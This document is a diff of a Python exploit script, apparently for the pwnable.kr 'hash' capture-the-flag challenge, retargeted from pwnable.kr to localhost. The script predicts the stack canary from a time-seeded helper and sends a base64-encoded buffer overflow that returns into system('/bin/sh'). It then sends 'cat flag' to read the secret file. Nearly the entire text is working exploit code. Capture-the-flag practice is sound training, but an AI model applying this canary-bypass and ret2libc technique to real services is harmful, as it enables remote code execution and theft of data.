@@ -24,12 +24,11 @@ def toHex(source):
 t=time.time()
 
 pwn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-pwn.connect(("pwnable.kr",9002))
+pwn.connect(("127.0.0.1",9002))
 
-#pwn=process(argv=["/home/etenal/pwnable.kr/hash/hash"])
 junk,captcha=pwn.recv(4096).split(':')
 captcha=captcha[1:len(captcha)]
-args=["/home/etenal/pwnable.kr/hash/randCalc",str(t),captcha.strip()]
+args=["./randCalc",str(t),captcha.strip()]
 subp=subprocess.Popen(args,stdout=subprocess.PIPE)
 cookie=toHex(subp.communicate()[0].strip())
 
@@ -40,10 +39,9 @@ print (struct.pack('I',cookie),struct.pack('I',addr_system),struct.pack('I',addr
 org_payload='\x41'*512+struct.pack('I',cookie)+'\x90'*12+struct.pack('I',addr_system)+struct.pack('I',addr_sh)
 payload=base64.b64encode(org_payload)+'\x00'*10+'/bin/sh'
 
-print (len(payload))
-pwn.send(payload+"\nls")
+pwn.send(payload+"\n")
+pwn.send("cat flag\n")
 print (pwn.recv(4096))
 print (pwn.recv(4096))
 print (pwn.recv(4096))
 print (pwn.recv(4096))
-#pwn.interactive()
